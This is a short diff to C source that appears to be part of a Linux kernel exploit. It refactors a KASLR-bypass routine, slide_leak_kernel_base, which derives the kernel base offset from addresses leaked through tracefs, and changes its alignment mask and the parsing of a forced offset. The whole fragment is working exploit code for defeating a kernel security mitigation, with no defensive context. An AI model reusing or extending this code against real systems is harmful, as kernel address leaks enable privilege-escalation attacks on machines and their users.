@@ -69,7 +69,7 @@ static int slide_tracefs_parse_page(
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= SLIDE_MAX_KASLR_OFFSET && (candidate & 0xffffULL) == 0) {
+        if (candidate <= SLIDE_MAX_KASLR_OFFSET && (candidate & (SLIDE_KASLR_ALIGN - 1)) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -148,9 +148,9 @@ int slide_leak_kernel_base(void) {
   if (forced_offset_arg && *forced_offset_arg) {
     char *end = NULL;
     errno = 0;
-    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    unsigned long long value = strtoull(forced_offset_arg, &end, SLIDE_ENV_BASE);
     if (errno || end == forced_offset_arg || *end || value > SLIDE_MAX_KASLR_OFFSET ||
-        (value & 0xffffULL) != 0) {
+        (value & (SLIDE_KASLR_ALIGN - 1)) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
